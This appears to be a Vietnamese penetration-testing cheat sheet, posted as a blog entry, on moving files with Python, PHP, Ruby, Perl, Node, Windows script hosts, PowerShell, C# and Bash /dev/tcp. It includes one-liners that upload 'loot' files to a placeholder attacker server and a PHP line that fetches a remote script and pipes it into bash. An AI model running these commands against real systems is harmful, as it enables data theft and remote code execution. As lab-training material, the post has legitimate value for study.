---
layout: post
title: "Transferring Files with Code"
render_with_liquid: false
categories:
  - File Transfer
tags:
  - file-transfer
  - code
source_collection: manual
---
Topics: File Transfer, Code

## Overview

Ghi chú nhanh các cách truyền file bằng code khi hệ thống không có sẵn tool như `wget`, `curl`, `scp`, hoặc khi cần viết một helper nhỏ để download/upload trong môi trường lab được phép kiểm thử.

Thông thường trên Linux sẽ gặp các runtime như `Python`, `PHP`, `Perl`, hoặc `Ruby`. Trên Windows ít phổ biến hơn, nhưng vẫn có thể gặp các runtime này nếu ứng dụng cần. Ngoài ra Windows có sẵn một số host/script runner như `cscript.exe`, `wscript.exe`, và `mshta.exe` để chạy JavaScript/VBScript/HTA.

Ý tưởng chính: nếu ngôn ngữ có thể mở URL, đọc byte, ghi file, hoặc gửi HTTP request thì có thể dùng nó để download/upload file. Điều quan trọng là biết runtime nào đang có, cách xử lý binary mode, và endpoint nhận file có hỗ trợ kiểu upload nào.

Trước khi chọn ngôn ngữ/runtime, cần kiểm tra:

- Runtime nào có sẵn: `python`, `python3`, `php`, `ruby`, `perl`, `node`, `powershell`, `.NET`, `cscript`, `mshta`
- Target có outbound HTTP/HTTPS không
- Có quyền ghi vào path nào, ví dụ `/tmp`, `/var/tmp`, `/dev/shm`, `%TEMP%`, hoặc `C:\Windows\Temp`
- File là text hay binary
- Có cần verify hash sau khi transfer không

## Python Download

Python 3:

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<server-ip>:8000/file.bin", "/tmp/file.bin")'
```

Python 2:

```bash
python2 -c 'import urllib; urllib.urlretrieve("http://<server-ip>:8000/file.bin", "/tmp/file.bin")'
```

## Python Upload

Upload file bằng multipart form-data cần nhiều code hơn. Nếu chỉ cần gửi raw body tới server nhận dữ liệu:

```bash
python3 -c 'import urllib.request; data=open("/tmp/loot.txt","rb").read(); urllib.request.urlopen(urllib.request.Request("http://<server-ip>:8000/upload", data=data, method="POST"))'
```

Nếu máy nhận chạy Python `uploadserver`:

```bash
python3 -m uploadserver
```

Upload multipart bằng module `requests`:

```bash
python3 -c 'import requests; requests.post("http://<server-ip>:8000/upload", files={"files": open("/tmp/loot.txt","rb")})'
```

`requests` không phải lúc nào cũng có sẵn mặc định. Nếu thiếu module này, dùng `curl`, raw POST bằng `urllib`, hoặc copy file qua một protocol khác.

## Python HTTP Server

Serve thư mục hiện tại:

```bash
python3 -m http.server 8000
```

Python 2:

```bash
python2 -m SimpleHTTPServer 8000
```

## PHP Download

`file_get_contents()` kết hợp `file_put_contents()`:

```bash
php -r 'file_put_contents("/tmp/file.bin", file_get_contents("http://<server-ip>:8000/file.bin"));'
```

Biến thể rõ ràng hơn:

```bash
php -r '$file = file_get_contents("http://<server-ip>:8000/file.bin"); file_put_contents("/tmp/file.bin", $file);'
```

## PHP Download With Fopen

`fopen()` phù hợp hơn khi muốn đọc/ghi theo buffer:

```bash
php -r 'const BUFFER = 1024; $r = fopen("http://<server-ip>:8000/file.bin", "rb"); $l = fopen("/tmp/file.bin", "wb"); while ($b = fread($r, BUFFER)) { fwrite($l, $b); } fclose($l); fclose($r);'
```

## PHP Fileless Pipe

Nếu `allow_url_fopen` được bật, URL có thể được đọc bằng `file()` rồi pipe vào shell/interpreter:

```bash
php -r '$lines = @file("http://<server-ip>:8000/script.sh"); foreach ($lines as $line) { echo $line; }' | bash
```

Chỉ dùng cách này với script bạn kiểm soát trong môi trường được phép.

## PHP Web Server

```bash
php -S 0.0.0.0:8000
```

## Ruby Download

Với `open-uri`:

```bash
ruby -e 'require "open-uri"; File.binwrite("/tmp/file.bin", URI.open("http://<server-ip>:8000/file.bin").read)'
```

Với `net/http`:

```bash
ruby -e 'require "net/http"; File.binwrite("/tmp/file.bin", Net::HTTP.get(URI.parse("http://<server-ip>:8000/file.bin")))'
```

## Ruby Web Server

```bash
ruby -run -ehttpd . -p8000
```

## Perl Download

Nếu có module `LWP::Simple`:

```bash
perl -MLWP::Simple -e 'getstore("http://<server-ip>:8000/file.bin", "/tmp/file.bin")'
```

Biến thể tương đương:

```bash
perl -e 'use LWP::Simple; getstore("http://<server-ip>:8000/file.bin", "/tmp/file.bin");'
```

Nếu chỉ có core module đơn giản hơn, có thể cần socket thủ công hoặc chuyển sang Python/PHP nếu có sẵn.

## Node.js Download

```bash
node -e 'const fs=require("fs"),http=require("http"); http.get("http://<server-ip>:8000/file.bin", r => r.pipe(fs.createWriteStream("/tmp/file.bin")));'
```

Với HTTPS:

```bash
node -e 'const fs=require("fs"),https=require("https"); https.get("https://<server-ip>/file.bin", r => r.pipe(fs.createWriteStream("/tmp/file.bin")));'
```

## JavaScript Download On Windows

Windows có thể chạy JScript bằng `cscript.exe`. Tạo file `wget.js`:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();

var BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1), 2);
```

Chạy từ `cmd.exe` hoặc PowerShell:

```cmd
cscript.exe /nologo wget.js http://<server-ip>:8000/file.bin C:\Windows\Temp\file.bin
```

## VBScript Download On Windows

Tạo file `wget.vbs`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Chạy:

```cmd
cscript.exe /nologo wget.vbs http://<server-ip>:8000/file.bin C:\Windows\Temp\file.bin
```

`mshta.exe` cũng có thể chạy JScript/VBScript/HTA, nhưng với download file nên ưu tiên script rõ ràng qua `cscript.exe` để dễ kiểm soát input/output trong lab.

## PowerShell Download

```powershell
(New-Object Net.WebClient).DownloadFile("http://<server-ip>:8000/file.bin", "C:\Windows\Temp\file.bin")
```

Hoặc:

```powershell
Invoke-WebRequest -Uri "http://<server-ip>:8000/file.bin" -OutFile "C:\Windows\Temp\file.bin"
```

## PowerShell Upload

```powershell
Invoke-WebRequest -Uri "http://<server-ip>:8000/upload" -Method POST -InFile "C:\Windows\Temp\loot.txt"
```

## C# Download

Nếu có compiler/runtime phù hợp, có thể dùng `WebClient` trong C#:

```csharp
using System.Net;

class Program
{
    static void Main()
    {
        using (var client = new WebClient())
        {
            client.DownloadFile("http://<server-ip>:8000/file.bin", @"C:\Windows\Temp\file.bin");
        }
    }
}
```

## Bash TCP Minimal HTTP GET

Khi chỉ có Bash hỗ trợ `/dev/tcp`:

```bash
exec 3<>/dev/tcp/<server-ip>/8000
echo -e "GET /file.txt HTTP/1.1\nHost: <server-ip>\n\n" >&3
cat <&3 > /tmp/http-response.txt
```

Response sẽ gồm cả HTTP headers; cần tách phần body trước khi dùng như file thật.

## Base64 With Code

Encode:

```bash
python3 -c 'import base64; print(base64.b64encode(open("/tmp/file.bin","rb").read()).decode())'
```

Decode:

```bash
python3 -c 'import base64; open("/tmp/file.bin","wb").write(base64.b64decode("<base64-data>"))'
```

## Verify File Integrity

Linux:

```bash
sha256sum /tmp/file.bin
md5sum /tmp/file.bin
```

Windows PowerShell:

```powershell
Get-FileHash C:\Windows\Temp\file.bin -Algorithm SHA256
```

Hash hai bên nên giống nhau trước khi chạy file hoặc dùng dữ liệu đã transfer.

## Notes

- Ưu tiên runtime có sẵn và ổn định nhất trên target.
- Với file binary, luôn mở file ở chế độ binary nếu ngôn ngữ có phân biệt text/binary mode.
- One-liner tiện trong shell hạn chế nhưng khó debug; nếu có quyền ghi, script ngắn thường dễ kiểm soát hơn.
- HTTP/HTTPS vẫn là transport phổ biến nhất vì thường được firewall cho phép.
